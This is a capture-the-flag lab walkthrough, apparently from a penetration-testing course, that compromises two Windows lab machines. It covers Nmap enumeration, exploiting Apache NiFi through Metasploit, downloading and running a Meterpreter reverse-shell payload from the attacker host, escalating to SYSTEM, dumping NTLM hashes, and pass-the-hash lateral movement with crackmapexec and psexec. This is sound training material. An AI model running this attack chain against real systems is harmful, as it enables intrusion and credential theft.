@@ -1,0 +1,85 @@
+Questions 3
+Capstone Exercise: Use the methods and techniques from this Module to enumerate VM Group 1. Get access to both machines and find the flag. Once the VM Group is deployed, please wait two more minutes for one of the web applications to be fully initialized.
+
+Hint
+1) Perform a full TCP port scan using Nmap to identify all open services.
+2) You can employ Nmap scripts and version scanning to gather more information about the services.
+3) Perform research in Metasploit to determine if there are any available exploitation modules.
+4) Prior to executing the exploitation module, ensure you set the correct OS version and payload according to your target.
+5) Attempt privilege escalation using MSF and proceed to lateral movement using cached things.
+
+sudo nmap -sC -sV -T4 -vvv -p- 192.168.195.225
+...
+135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 125
+8080/tcp open  http          syn-ack ttl 125 Jetty 9.4.48.v20220622
+...
+
+sudo nmap -sC -sV -T4 -vvv -p- 192.168.195.226
+...
+135/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds? syn-ack ttl 125
+...
+
+# Try to access the http port discovered
+http://192.168.195.225:8080/nifi/
+1.18.0 snapshot
+
+# Aboe showing the Apache Nifi is being used 
+https://labs.withsecure.com/tools/metasploit-modules-for-rce-in-apache-nifi-and-kong-api-gateway
+https://github.com/Rapidsafeguard/Apache-Nifi
+
+# Where we will follow the guide from 1st reference link
+sudo msfconsole -q
+msf6 > use multi/http/apache_nifi_processor_rce
+msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 192.168.195.225
+msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST tun0
+msf6 exploit(multi/http/apache_nifi_processor_rce) > set target 1
+msf6 exploit(multi/http/apache_nifi_processor_rce) > set AutoCheck false
+msf6 exploit(multi/http/apache_nifi_processor_rce) > set ssl false
+msf6 exploit(multi/http/apache_nifi_processor_rce) > run
+C:\nifi-1.17.0>
+C:\nifi-1.17.0>whoami /priv
+...
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+...
+
+C:\nifi-1.17.0>powershell -ep bypass
+PS C:\nifi-1.17.0> iwr -uri http://192.168.45.214/met.exe -Outfile met.exe
+
+# Lets prepare the another listener
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set LPORT 443
+msf6 exploit(multi/handler) > set LHOST tun0
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter_reverse_https
+msf6 exploit(multi/handler) > run -j
+
+# Go to target machine
+PS C:\nifi-1.17.0> .\met.exe
+
+msf6 exploit(multi/handler) > sessions -i 1 --timeout 60
+meterpreter > getuid
+Server username: ITWK03\alex
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter > load kiwi
+meterpreter > creds_msv
+...
+alex         ITWK03  5391f1724568f48a4aadba748109864c  3c0c8334c4b5a80345d40e00550539a7c847809c
+itwk04admin  ITWK03  445414c16b5689513d4ad8234391aacf  3b25183b0c39fd03069f586c7d238160f54b6cd7
+offsec       ITWK03  b26462f877427f4f6a87605d587ac60d  f237f7e3b1958e6047f1b29716a2f776dbdb5a19
+...
+
+crackmapexec smb 192.168.195.226 -u 'itwk04admin' -H '00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf'
+...
+SMB         192.168.195.226 445    ITWK04           [*] Windows 11 Build 22000 x64 (name:ITWK04) (domain:itwk04) (signing:False) (SMBv1:False)
+SMB         192.168.195.226 445    ITWK04           [+] itwk04\itwk04admin:445414c16b5689513d4ad8234391aacf (Pwn3d!)
+...
+
+# Pwned! and now we can use impacket psexec to exploit
+impacket-psexec -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.195.226
+C:\Users\itwk04admin\Desktop> type flag.txt
+OS{73fdd1baeba316cc2fcbcb56c4f849ff}
+
